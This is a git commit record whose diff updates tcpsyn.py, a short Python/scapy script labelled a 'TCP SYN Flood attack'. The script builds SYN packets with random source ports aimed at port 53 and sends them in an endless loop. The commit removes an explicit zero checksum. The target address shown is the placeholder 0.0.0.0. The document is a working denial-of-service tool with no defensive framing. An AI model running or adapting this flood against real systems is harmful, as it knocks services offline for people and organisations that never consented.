25f2605526dcdb70426354d7de470a12add36e9d
hackingyseguridad <antonio_taboada@hotmail.es>
2019-10-08 16:49:42 +0200

    Update tcpsyn.py

--- tcpsyn.py
+++ tcpsyn.py
@@ -4,7 +4,7 @@
 # Description : TCP SYN Flood attack
 import sys
 from scapy.all import *
-ip=IP(dst="0.0.0.0",chksum=0,frag=0,ttl=64)
+ip=IP(dst="0.0.0.0",frag=0,ttl=64)
 SYN=TCP(sport=RandShort(),dport=53,flags="S",window=29200)
 while True:
     send(ip/SYN)
